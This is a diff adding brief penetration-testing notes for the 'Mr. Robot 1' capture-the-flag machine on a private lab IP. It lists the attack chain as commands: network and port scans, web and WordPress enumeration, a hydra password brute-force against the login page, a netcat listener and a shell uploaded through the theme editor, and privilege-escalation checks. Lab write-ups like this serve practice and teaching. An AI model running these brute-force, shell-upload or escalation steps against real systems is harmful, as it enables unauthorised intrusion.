@@ -1,1 +1,27 @@
+# Mr. Robot 1 - Notes
+
+Target IP: 192.168.164.129
+
+--- Network Discovery ---
+netdiscover
+
+--- Port Scan ---
+nmap -sS -sV -A 192.168.164.129
+
+--- Web Enumeration ---
+dirb http://192.168.164.129
+robots.txt -> /fsocity.dic, /key-1-of-3.txt
+
+--- WordPress Scan ---
+wpscan --url http://192.168.164.129 --enumerate u
+hydra -l elliot -P fsocity.dic 192.168.164.129 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
+
+--- Reverse Shell ---
+nc -lvnp 4444
+upload shell via WordPress theme editor
+
+--- Privilege Escalation ---
+sudo -l
+linpeas.sh
+exploit misconfigured binary
 
